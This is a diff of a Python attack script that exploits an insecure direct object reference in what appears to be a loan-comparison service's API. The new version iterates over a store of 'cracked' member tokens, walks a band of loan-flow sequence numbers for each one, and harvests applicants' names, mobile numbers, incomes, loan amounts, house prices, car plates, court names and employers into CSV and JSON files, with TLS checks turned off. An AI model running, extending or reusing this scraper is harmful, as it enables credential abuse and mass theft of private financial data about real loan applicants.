@@ -1,17 +1,22 @@
 #!/usr/bin/env python3
-"""Walk loan-application flow records backwards by bigyoLoanFlwSeq (IDOR).
+"""Walk loan-application flow records by bigyoLoanFlwSeq (IDOR) — v2 multi-token.
 
-Phase 1: exponentially locate the highest existing seq.
-Phase 2: walk downwards, capturing every record; flag rows dated today.
-Works anonymously if allowed, else with the first cracked member token.
-Outputs loan_flows_recent.csv + loan_flows/<seq>.json.
-Cap: MAX_WALK successive probes (default 400) or until 5 consecutive misses.
+Ownership-scoped reality (established): getBigyoLoanFlw returns data ONLY for
+seqs belonging to the presenting token's member. So the global top is invisible
+to any single token; instead we walk a RECENT band centered on the highest seq
+we know exists (from flow_seqs.json / loans_raw loReqtNo / prior captures),
+once per cracked token. Hits are tagged with the owner's mobile.
+
+Watermark: walked_band.json remembers the last band top per flowType; a band is
+skipped if the top is unchanged and the last walk is < 12h old.
+Outputs loan_flows_recent.csv + loan_flows/<owner>_<ft>_<seq>.json.
 """
 import csv
 import json
 import os
 import ssl
 import time
+import urllib.error
 import urllib.request
 
 HERE = os.path.dirname(os.path.abspath(__file__))
@@ -21,48 +26,38 @@ CTX = ssl.create_default_context()
 CTX.check_hostname = False
 CTX.verify_mode = ssl.CERT_NONE
 
-FLOW_TYPES = ["CREDIT", "COMBINE", "MORTGAGE", "ETC", "REHAB_ONE"]
-MAX_WALK = 400
+FLOW_TYPES = ["CREDIT", "COMBINE"]
+BAND_SIZE = 300
+MIN_TOP = 1000
+REWALK_HOURS = 12
 CSV_PATH = os.path.join(HERE, "loan_flows_recent.csv")
 RAW_DIR = os.path.join(HERE, "loan_flows")
+WM_FILE = os.path.join(HERE, "walked_band.json")
 os.makedirs(RAW_DIR, exist_ok=True)
 
 TODAY = time.strftime("%Y%m%d")
 
-TOKEN = None
 try:
     import tokstore
-    _creds = tokstore.load()
-    if _creds:
-        TOKEN = _creds[0]["token"]
-except Exception as _e:
-    print(f"TOKSTORE LOAD FAIL: {_e}", flush=True)
+    CREDS = tokstore.load()
+except Exception as e:
+    print(f"TOKSTORE LOAD FAIL: {e}", flush=True)
+    CREDS = []
 
 
-_DBG_LEFT = [6]
-
-
-def raw_fetch(seq, ft):
+def fetch(token, seq, ft):
     body = json.dumps({"bigyoLoanFlwSeq": str(seq), "flowType": ft,
                        "applyType": "EXISTING", "step": "1"}).encode()
-    hdrs = {"User-Agent": UA, "Content-Type": "application/json"}
-    if TOKEN:
-        hdrs["Authorization"] = "Bearer " + TOKEN
+    hdrs = {"User-Agent": UA, "Content-Type": "application/json",
+            "Authorization": "Bearer " + token}
     req = urllib.request.Request(f"{BASE}?flowType={ft}", data=body, headers=hdrs)
     try:
         with urllib.request.urlopen(req, timeout=10, context=CTX) as r:
-            return r.status, r.read().decode("utf-8", "replace")
+            txt = r.read().decode("utf-8", "replace")
     except urllib.error.HTTPError as e:
-        return e.code, e.read().decode("utf-8", "replace")
+        txt = e.read().decode("utf-8", "replace")
     except Exception as e:
-        return None, repr(e)[:160]
-
-
-def fetch(seq, ft):
-    status, txt = raw_fetch(seq, ft)
-    if _DBG_LEFT[0] > 0:
-        _DBG_LEFT[0] -= 1
-        print(f"DBG fetch seq={seq} ft={ft} http={status} body={txt[:240]}", flush=True)
+        return None
     try:
         d = json.loads(txt)
     except Exception:
@@ -73,80 +68,113 @@ def fetch(seq, ft):
     return None
 
 
-def locate_top(ft):
-    lo, hi = 1, 10
-    while fetch(hi, ft) is not None and hi < 10 ** 9:
-        lo = hi
-        hi *= 10
-    if fetch(lo, ft) is None:
-        return lo
-    while lo + 1 < hi:
-        mid = (lo + hi) // 2
-        if fetch(mid, ft) is not None:
-            lo = mid
-        else:
-            hi = mid
-        time.sleep(0.3)
-    return lo
+def known_max_seq():
+    best = 0
+    fs = os.path.join(HERE, "flow_seqs.json")
+    if os.path.exists(fs):
+        try:
+            for v in json.load(open(fs)).values():
+                if str(v).isdigit():
+                    best = max(best, int(v))
+        except Exception:
+            pass
+    rd = os.path.join(HERE, "loans_raw")
+    if os.path.isdir(rd):
+        for fn in os.listdir(rd):
+            if not fn.endswith(".json"):
+                continue
+            try:
+                raw = json.load(open(os.path.join(rd, fn)))
+                loans = raw.get("loans") or {}
+                lst = loans.get("data") if isinstance(loans, dict) else (loans if isinstance(loans, list) else None)
+                if isinstance(lst, list):
+                    for it in lst:
+                        v = str(it.get("loReqtNo") or "")
+                        if v.isdigit():
+                            best = max(best, int(v))
+            except Exception:
+                continue
+    ld = RAW_DIR
+    if os.path.isdir(ld):
+        for fn in os.listdir(ld):
+            parts = fn.rsplit("_", 1)
+            if len(parts) == 2 and parts[1].rstrip(".json").isdigit():
+                best = max(best, int(parts[1].rstrip(".json")))
+    return best
 
 
-def walk(ft, top):
-    rows, miss = [], 0
-    for seq in range(top, max(0, top - MAX_WALK), -1):
-        d = fetch(seq, ft)
-        if d is None:
-            miss += 1
-            if miss >= 5:
-                break
-            continue
-        miss = 0
-        with open(os.path.join(RAW_DIR, f"{ft}_{seq}.json"), "w") as f:
-            json.dump(d, f, ensure_ascii=False, indent=1)
-        dt = str(d.get("requestDt") or d.get("aplyDt") or "").strip("-")[:8]
-        rows.append({
-            "seq": seq, "flowType": ft,
-            "name": d.get("name", ""), "mobile": d.get("mobile", ""),
-            "requestDt": dt, "today": dt == TODAY,
-            "loanAmount": d.get("loanAmount", ""),
-            "annualIncom": d.get("annualIncom", ""),
-            "housePrice": d.get("housePrice", ""),
-            "houseType": d.get("houseType", ""),
-            "carNo": d.get("carNo", ""),
-            "courtNm": d.get("courtNm", ""),
-            "jobType": d.get("jobType", ""),
-            "employer": d.get("companyName", ""),
-            "memberSeq": d.get("memberSeq", ""),
-            "loReqtNo": d.get("loReqtNo", ""),
-        })
-        time.sleep(0.4)
-    return rows
+def load_watermarks():
+    if os.path.exists(WM_FILE):
+        try:
+            return json.load(open(WM_FILE))
+        except Exception:
+            pass
+    return {}
 
 
-FIELDS = ["seq", "flowType", "name", "mobile", "requestDt", "today",
+def save_watermarks(wm):
+    with open(WM_FILE, "w") as f:
+        json.dump(wm, f, indent=1)
+
+
+FIELDS = ["seq", "flowType", "ownerMobile", "name", "mobile", "requestDt", "today",
           "loanAmount", "annualIncom", "housePrice", "houseType", "carNo",
           "courtNm", "jobType", "employer", "memberSeq", "loReqtNo"]
 
 
 def main():
-    print(f"TOKEN={'yes '+TOKEN[:24]+'...' if TOKEN else 'NO (anonymous)'}", flush=True)
+    if not CREDS:
+        print("WALK v2: no cracked tokens")
+        return
+    km = known_max_seq()
+    top_est = max(km + 300, MIN_TOP)
+    wm = load_watermarks()
+    print(f"WALK v2 tokens={[c['mobile'] for c in CREDS]} known_max={km} band_top={top_est}", flush=True)
     all_rows = []
     for ft in FLOW_TYPES:
-        print(f"== locating top seq for {ft} ...", flush=True)
-        top = locate_top(ft)
-        print(f"   top={top}; walking down", flush=True)
-        rows = walk(ft, top)
-        print(f"   {ft}: captured {len(rows)}", flush=True)
-        all_rows.extend(rows)
+        prev = wm.get(ft, {})
+        if prev.get("top") == top_est and time.time() - prev.get("ts", 0) < REWALK_HOURS * 3600:
+            print(f"  {ft}: band unchanged ({top_est}), rewalk suppressed", flush=True)
+            continue
+        for cr in CREDS:
+            owner = cr["mobile"]
+            hits = 0
+            for seq in range(top_est, max(0, top_est - BAND_SIZE), -1):
+                d = fetch(cr["token"], seq, ft)
+                if d:
+                    hits += 1
+                    with open(os.path.join(RAW_DIR, f"{owner}_{ft}_{seq}.json"), "w") as f:
+                        json.dump(d, f, ensure_ascii=False, indent=1)
+                    dt = str(d.get("requestDt") or d.get("aplyDt") or "").strip("-")[:8]
+                    all_rows.append({
+                        "seq": seq, "flowType": ft, "ownerMobile": owner,
+                        "name": d.get("name", ""), "mobile": d.get("mobile", ""),
+                        "requestDt": dt, "today": dt == TODAY,
+                        "loanAmount": d.get("loanAmount", ""),
+                        "annualIncom": d.get("annualIncom", ""),
+                        "housePrice": d.get("housePrice", ""),
+                        "houseType": d.get("houseType", ""),
+                        "carNo": d.get("carNo", ""),
+                        "courtNm": d.get("courtNm", ""),
+                        "jobType": d.get("jobType", ""),
+                        "employer": d.get("companyName", ""),
+                        "memberSeq": d.get("memberSeq", ""),
+                        "loReqtNo": d.get("loReqtNo", ""),
+                    })
+                time.sleep(0.3)
+            print(f"  {ft} owner={owner}: {hits} hits in band", flush=True)
+        wm[ft] = {"top": top_est, "ts": time.time()}
+        save_watermarks(wm)
     all_rows.sort(key=lambda r: (r["requestDt"], r["seq"]), reverse=True)
     new = not os.path.exists(CSV_PATH)
     with open(CSV_PATH, "a", newline="", encoding="utf-8") as f:
-        w = csv.DictWriter(f, fieldnames=FIELDS)
+        w = csv.DictWriter(f, fieldnames=FIELDS, extrasaction="ignore")
         if new:
             w.writeheader()
         for r in all_rows:
             w.writerow(r)
     todays = [r for r in all_rows if r["today"]]
-    print(f"WALK DONE: {len(all_rows)} rows, {len(todays)} dated today {TODAY}")
+    print(f"WALK v2 DONE: {len(all_rows)} rows, {len(todays)} dated today {TODAY}")
 
 
 if __name__ == "__main__":
